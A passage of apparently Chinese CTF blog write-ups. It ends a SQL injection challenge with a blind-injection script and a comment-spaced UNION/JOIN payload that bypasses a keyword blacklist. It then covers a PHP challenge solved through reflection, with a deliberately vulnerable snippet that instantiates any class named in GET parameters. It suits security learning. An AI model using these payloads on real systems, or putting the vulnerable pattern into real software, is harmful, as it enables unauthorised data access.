chr(j)</span><br><span class="line">        retry = <span class="number">3</span></span><br><span class="line">        <span class="keyword">while</span> retry &gt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                now = time.time()</span><br><span class="line">                exp(i, j)</span><br><span class="line">                end = time.time()</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                <span class="comment"># 重试</span></span><br><span class="line">                retry -= <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> end - now &gt; <span class="number">2</span>:</span><br><span class="line">            print(c)</span><br><span class="line">            flag += c</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">&#x27;not in letters&#x27;</span>)</span><br><span class="line"></span><br><span class="line">print(flag[::<span class="number">-1</span>])</span><br></pre></td></tr></table></figure>
运行结果：<br><img data-src="/2020/10/21/blacklist-writeup/2020-10-21-13-50-12.png"></li>
</ol>
<h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用<code>join</code>可以把两个表查询的结果左右合并，从而拼接多个字段，如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>)a <span class="keyword">where</span> <span class="string">&#x27;a&#x27;</span>=<span class="string">&#x27;a&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>)b <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">2</span>)c;</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/10/21/blacklist-writeup/2020-10-23-11-45-38.png"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 创建数据库及表</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> flag;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> flag (flag <span class="built_in">varchar</span>(<span class="number">43</span>));</span><br><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> flag (flag) <span class="keyword">values</span> (<span class="string">&#x27;flag&#123;810a9492-bfac-4a9b-be38-823b6efd7ab5&#125;&#x27;</span>);</span><br><span class="line"><span class="comment"># 测试语句</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>)a <span class="keyword">where</span> <span class="string">&#x27;a&#x27;</span>=<span class="string">&#x27;a&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> * <span class="keyword">from</span> flag <span class="keyword">join</span> (<span class="keyword">select</span> <span class="number">1</span>) a;</span><br></pre></td></tr></table></figure>
<p><img data-src="/2020/10/21/blacklist-writeup/2020-10-23-11-46-49.png"></p>
<p>根据上面的实验，最终构造如下payload：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1&#x27;<span class="comment">/**/</span>&amp;<span class="comment">/**/</span>1<span class="comment">/**/</span>like<span class="comment">/**/</span>0<span class="comment">/**/</span>union<span class="comment">/**/</span><span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span><span class="number">1</span>)a<span class="comment">/**/</span><span class="keyword">join</span><span class="comment">/**/</span>(<span class="keyword">select</span><span class="comment">/**/</span>*<span class="comment">/**/</span><span class="keyword">from</span><span class="comment">/**/</span>flag)b<span class="comment">#</span></span><br></pre></td></tr></table></figure>
<p>编码后发送可取得flag<br><img data-src="/2020/10/21/blacklist-writeup/2020-10-23-11-50-59.png"></p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SQLi</tag>
      </tags>
  </entry>
  <entry>
    <title>fslh-writeup</title>
    <url>/2020/10/28/fslh-writeup/</url>
    <content><![CDATA[<p><strong>本文仅作为技术讨论及分享，严禁用于任何非法用途。</strong></p>
<h3 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h3><p>在某次比赛中碰到一题很魔幻的题目，让我印象深刻，特别是赛后主办方提供的wp（见下图）看得我久久不能忘怀，机缘巧合之下，又碰到了这一题目，故来分析一下。</p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108120312799.png" alt="主办方的wp"></p>
<a id="more"></a>

<h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>题目打开只有一个500报错</p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108110716269.png" alt="index页面"></p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108110825271.png" alt="500报错"></p>
<p>扫描源代码文件，发现<code>index.php.swo</code>备份文件（坑！少见的备份文件格式，其是vim打开文件后的缓存文件），以下为文件内容：</p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108110954007.png" alt="index.php.swo"></p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108111020441.png" alt="index.php.swo"></p>
<p>分析题目，猜测flag是藏在类的注释中，我们能够实例化任意类，并调用类方法，那么就可以利用PHP 内置类中的 <code>ReflectionMethod</code>来读取<code>User</code>类里面各个函数的注释，本地测试如下：</p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108115520912.png" alt="本地测试ReflectionMethod"></p>
<p>构造成题目中的http参数则是：<code>?rc=ReflectionMethod&amp;ra=User&amp;rb=a&amp;rd=getDocComment</code></p>
<p>因为不知道是在哪个函数的注释中，所以逐个函数暴破，暴破<code>rb</code>的值<code>a-z</code>，可以发现<code>flag</code>在<code>q</code>的注释中</p>
<p><img data-src="/2020/10/28/fslh-writeup/image-20201108113842585.png" alt="遍历函数注释内容"></p>
<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>本题考察的是<code>PHP反射</code>，<code>ReflectionMethod</code>构造<code>User</code>类中的函数方法，再通过<code>getDocComment</code>获取函数的注释，本例中使用<code>__toString</code>同样可以输出函数注释内容。</p>
<h3 id="附"><a href="#附" class="headerlink" title="附"></a>附</h3><h4 id="ReflectionClass-API"><a href="#ReflectionClass-API" class="headerlink" title="ReflectionClass API"></a>ReflectionClass API</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$ref = <span class="keyword">new</span> ReflectionClass(B::class);</span><br><span class="line"></span><br><span class="line"><span class="comment">//print_r(ReflectionClass::export(demo::class));</span></span><br><span class="line">print_r($ref-&gt;getProperties()); <span class="comment">// 获取一级属性, 可以传参数过滤, 返回ReflectionProperty 对象的数组。</span></span><br><span class="line">var_dump($ref-&gt;getConstructor()); <span class="comment">// 获取构造函数, 未定义返回null</span></span><br><span class="line">var_dump($ref-&gt;inNamespace()); <span class="comment">// 是否在命名空间中</span></span><br><span class="line">var_dump($ref-&gt;getConstants()); <span class="comment">// 获取所有定义的常量</span></span><br><span class="line">var_dump($ref-&gt;getConstant(<span class="string">&#x27;TEST_1&#x27;</span>)); <span class="comment">// 获取某个常量</span></span><br><span class="line">print_r($ref-&gt;getDefaultProperties()); <span class="comment">// 获取默认属性, 返回数组, 包括父类的属性</span></span><br><span class="line">var_dump($ref-&gt;getDocComment()); <span class="comment">// 获取类文档注释, 不包含属性和方法的注释, 无注释返回false</span></span><br><span class="line">var_dump($ref-&gt;getExtension()); <span class="comment">// 获取获取最后一行的行数</span></span><br><span class="line">var_dump($ref-&gt;getFileName()); <span class="comment">// 获取定义类的文件名, 返回绝对路径</span></span><br><span class="line">var_dump($ref-&gt;getInterfaceNames()); <span class="comment">// 获取接口名称, 返回索引数组,值为接口名称, 未实现接口返回空数组</span></span><br><span class="line">var_dump($ref-&gt;getInterfaces()); <span class="comment">// 获取接口, 返回关联数组, name=&gt;ReflectionClass实例, 未实现接口返回空数组</span></span><br><span class="line">var_dump($ref-&gt;getMethods()); <span class="comment">// 指获取类方法 ReflectionMethod。</span></span><br><span class="line">var_dump($ref-&gt;getMethod(<span class="string">&#x27;foo4&#x27;</span>)); <span class="comment">// 获取一个类方法的 ReflectionMethod。如果方法不存在会抛出异常, 需要配合try catch一起用</span></span><br><span class="line">var_dump($ref-&gt;getName()); <span class="comment">// 获取类名, 包含命名空间</span></span><br><span class="line">var_dump($ref-&gt;getNamespaceName()); <span class="comment">// 获取命名空间的名称, 没有返回空</span></span><br><span class="line">var_dump($ref-&gt;getParentClass()); <span class="comment">// 获取父类reflectionClass的实例, 没有父类返回false</span></span><br><span class="line">var_dump($ref-&gt;getProperty(<span class="string">&#x27;prop3&#x27;</span>)); <span class="comment">// 获取一个属性, 返回ReflectionProperty实例, 属性不存在会抛出异常, 需配合try catch使用</span></span><br><span class="line">var_dump($ref-&gt;getShortName()); <span class="comment">// 获取类名, 不包含命名空间</span></span><br><span class="line">var_dump($ref-&gt;getStartLine()); <span class="comment">// 获取起始行号</span></span><br><span class="line">print_r($ref-&gt;getStaticProperties()); <span class="comment">// 获取静态属性</span></span><br><span class="line">print_r($ref-&gt;getStaticPropertyValue(<span class="string">&#x27;prop_static&#x27;</span>)); <span class="comment">// 获取静态属性值, 未定义的属性会报致命错误</span></span><br><span class="line">print_r($ref-&gt;getTraitAliases()); <span class="comment">// 返回 trait 别名的一个数组</span></span><br><span class="line">print_r($ref-&gt;getTraitNames()); <span class="comment">// 返回 trait 别名的一个数组</span></span><br><span class="line">print_r($ref-&gt;getTraits()); <span class="comment">// 返回这个类所使用的 traits 数组</span></span><br><span class="line">var_dump($ref-&gt;hasConstant(<span class="string">&#x27;AB&#x27;</span>)); <span class="comment">// 检查常量是否已经定义</span></span><br><span class="line">var_dump($ref-&gt;hasMethod(<span class="string">&#x27;AB&#x27;</span>)); <span class="comment">// 检查方法是否已经定义</span></span><br><span class="line">var_dump($ref-&gt;hasProperty(<span class="string">&#x27;AB&#x27;</span>)); <span class="comment">// 检查属性是否已定义</span></span><br><span class="line">var_dump($ref-&gt;implementsInterface(<span class="string">&#x27;reflection\Abc&#x27;</span>)); <span class="comment">// 检查是否实现了某个接口, 注意需要带上命名空间</span></span><br><span class="line">var_dump($ref-&gt;isAbstract()); <span class="comment">// 检查类是否是抽象类（abstract）</span></span><br><span class="line">var_dump($ref-&gt;isAnonymous()); <span class="comment">// 检查类是否是匿名类</span></span><br><span class="line">var_dump($ref-&gt;isCloneable()); <span class="comment">// 返回了一个类是否可复制</span></span><br><span class="line">var_dump($ref-&gt;isFinal()); <span class="comment">// 检查类是否声明为 final</span></span><br><span class="line">var_dump($ref-&gt;isInstance($obj)); <span class="comment">// 检查一个变量是否此类的实例</span></span><br><span class="line">var_dump($ref-&gt;isInstantiable()); <span class="comment">// 检查类是否可实例化</span></span><br><span class="line">var_dump($ref-&gt;isInterface()); <span class="comment">// 检查类是否是一个接口（interface）</span></span><br><span class="line">var_dump($ref-&gt;isInternal()); <span class="comment">// 检查类是否由扩展或核心在内部定义, 和isUserDefined相对</span></span><br><span class="line">var_dump($ref-&gt;isIterateable()); <span class="comment">// 检查此类是否可迭代, 实现了Iterator接口即可迭代</span></span><br><span class="line">var_dump($ref-&gt;isSubclassOf(A::class)); <span class="comment">// 是否是某一个类的子类</span></span><br><span class="line">var_dump($ref-&gt;isTrait()); <span class="comment">// 返回了是否为一个 trait</span></span><br><span class="line">var_dump($ref-&gt;isUserDefined()); <span class="comment">// 检查是否由用户定义的类 和isInternal相对</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。</span></span><br><span class="line"><span class="comment">// 接受可变数目的参数，用于传递到类的构造函数，和 call_user_func() 很相似。</span></span><br><span class="line">var_dump($ref-&gt;newInstance());</span><br><span class="line"><span class="comment">// 从指定的参数创建一个新的类实例,创建类的新的实例。给出的参数将会传递到类的构造函数。</span></span><br><span class="line"><span class="comment">//这个参数以 array 形式传递到类的构造函数。</span></span><br><span class="line">var_dump($ref-&gt;newInstanceArgs([]));</span><br><span class="line">var_dump($ref-&gt;newInstanceWithoutConstructor()); <span class="comment">// 创建一个新的实例而不调用他的构造函数</span></span><br><span class="line">$ref-&gt;setStaticPropertyValue (<span class="string">&#x27;prop_static&#x27;</span>, <span class="string">&#x27;222&#x27;</span>); <span class="comment">// 设置静态属性的值, 无返回值</span></span><br><span class="line">var_dump($ref-&gt;__toString ()); <span class="comment">// 返回 ReflectionClass 对象字符串的表示形式。</span></span><br><span class="line">​```</span><br></pre></td></tr></table></figure>

<h4 id="ReflectionMethod-API"><a href="#ReflectionMethod-API" class="headerlink" title="ReflectionMethod API"></a>ReflectionMethod API</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">ReflectionMethod::__construct — ReflectionMethod 的构造函数</span></span><br><span class="line"><span class="comment">ReflectionMethod::export — 输出一个回调方法</span></span><br><span class="line"><span class="comment">ReflectionMethod::getClosure — 返回一个动态建立的方法调用接口，译者注：可以使用这个返回值直接调用非公开方法。</span></span><br><span class="line"><span class="comment">ReflectionMethod::getDeclaringClass — 获取被反射的方法所在类的反射实例</span></span><br><span class="line"><span class="comment">ReflectionMethod::getModifiers — 获取方法的修饰符</span></span><br><span class="line"><span class="comment">ReflectionMethod::getPrototype — 返回方法原型 (如果存在)</span></span><br><span class="line"><span class="comment">ReflectionMethod::invoke — Invoke</span></span><br><span class="line"><span class="comment">ReflectionMethod::invokeArgs — 带参数执行</span></span><br><span class="line"><span class="comment">ReflectionMethod::isAbstract — 判断方法是否是抽象方法</span></span><br><span class="line"><span class="comment">ReflectionMethod::isConstructor — 判断方法是否是构造方法</span></span><br><span class="line"><span class="comment">ReflectionMethod::isDestructor — 判断方法是否是析构方法</span></span><br><span class="line"><span class="comment">ReflectionMethod::isFinal — 判断方法是否定义 final</span></span><br><span class="line"><span class="comment">ReflectionMethod::isPrivate — 判断方法是否是私有方法</span></span><br><span class="line"><span class="comment">ReflectionMethod::isProtected — 判断方法是否是保护方法 (protected)</span></span><br><span class="line"><span class="comment">ReflectionMethod::isPublic — 判断方法是否是公开方法</span></span><br><span class="line"><span class="comment">ReflectionMethod::isStatic — 判断方法是否是静态方法</span></span><br><span class="line"><span class="comment">ReflectionMethod::setAccessible — 设置方法是否访问</span></span><br><span class="line"><span class="comment">ReflectionMethod::__toString — 返回反射方法对象的字符串表达</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">ReflectionMethod <span class="keyword">extends</span> ReflectionFunctionAbstract <span class="keyword">implements</span> Reflector &#123;</span><br><span class="line"><span class="comment">/* 常量 */</span></span><br><span class="line"><span class="keyword">const</span> <span class="keyword">integer</span> IS_STATIC = <span class="number">1</span> ;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">integer</span> IS_PUBLIC = <span class="number">256</span> ;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">integer</span> IS_PROTECTED = <span class="number">512</span> ;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">integer</span> IS_PRIVATE = <span class="number">1024</span> ;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">integer</span> IS_ABSTRACT = <span class="number">2</span> ;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">integer</span> IS_FINAL = <span class="number">4</span> ;</span><br><span class="line"><span class="comment">/* 属性 */</span></span><br><span class="line"><span class="keyword">public</span> $name ;</span><br><span class="line"><span class="keyword">public</span> $class ;</span><br><span class="line"><span class="comment">/* 方法 */</span></span><br><span class="line"><span class="keyword">public</span> __construct ( mixed $class , <span class="keyword">string</span> $name )</span><br><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> export ( <span class="keyword">string</span> $class , <span class="keyword">string</span> $name [, <span class="keyword">bool</span> $return = <span class="literal">false</span> ] ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> getClosure ( <span class="keyword">object</span> $object ) : <span class="built_in">Closure</span></span><br><span class="line"><span class="keyword">public</span> getDeclaringClass ( ) : ReflectionClass</span><br><span class="line"><span class="keyword">public</span> getModifiers ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> getPrototype ( ) : ReflectionMethod</span><br><span class="line"><span class="keyword">public</span> invoke ( <span class="keyword">object</span> $object [, mixed $parameter [, mixed $... ]] ) : mixed</span><br><span class="line"><span class="keyword">public</span> invokeArgs ( <span class="keyword">object</span> $object , <span class="keyword">array</span> $args ) : mixed</span><br><span class="line"><span class="keyword">public</span> isAbstract ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isConstructor ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isDestructor ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isFinal ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isPrivate ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isProtected ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isPublic ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> isStatic ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> setAccessible ( <span class="keyword">bool</span> $accessible ) : <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> __toString ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="comment">/* 继承的方法 */</span></span><br><span class="line"><span class="keyword">final</span> <span class="keyword">private</span> ReflectionFunctionAbstract::__clone ( ) : <span class="keyword">void</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getClosureScopeClass ( ) : ReflectionClass</span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getClosureThis ( ) : <span class="keyword">object</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getDocComment ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getEndLine ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getExtension ( ) : ReflectionExtension</span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getExtensionName ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getFileName ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getName ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getNamespaceName ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getNumberOfParameters ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getNumberOfRequiredParameters ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getParameters ( ) : <span class="keyword">array</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getReturnType ( ) : ReflectionType</span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getShortName ( ) : <span class="keyword">string</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getStartLine ( ) : <span class="keyword">int</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::getStaticVariables ( ) : <span class="keyword">array</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::hasReturnType ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::inNamespace ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::isClosure ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::isDeprecated ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::isGenerator ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::isInternal ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::isUserDefined ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::isVariadic ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">public</span> ReflectionFunctionAbstract::returnsReference ( ) : <span class="keyword">bool</span></span><br><span class="line"><span class="keyword">abstract</span> <span class="keyword">public</span> ReflectionFunctionAbstract::__toString ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="伪源码"><a href="#伪源码" class="headerlink" title="伪源码"></a>伪源码</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">static</span> $c = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">a</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">b</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">c</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">d</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">e</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">f</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">g</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">h</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">i</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">j</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">k</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">l</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">m</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">n</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">o</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">p</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/** </span></span><br><span class="line"><span class="comment">    * Increment counter</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@final</span></span></span><br><span class="line"><span class="comment">    * <span class="doctag">@static</span></span></span><br><span class="line"><span class="comment">    * <span class="doctag">@access</span>  publicflag&#123;b5bd0ab820fd11eb8cf4fa163e83cb88&#125;</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@return</span>  int</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">q</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">r</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">s</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">t</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> ++<span class="built_in">self</span>::$c;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$rc=$_GET[<span class="string">&quot;rc&quot;</span>];</span><br><span class="line">$rb=$_GET[<span class="string">&quot;rb&quot;</span>];</span><br><span class="line">$ra=$_GET[<span class="string">&quot;ra&quot;</span>];</span><br><span class="line">$rd=$_GET[<span class="string">&quot;rd&quot;</span>];</span><br><span class="line">$method= <span class="keyword">new</span> $rc($ra, $rb);</span><br><span class="line">var_dump($method-&gt;$rd());</span><br><span class="line"></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>WEB</tag>
        <tag>CTF</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
</search>
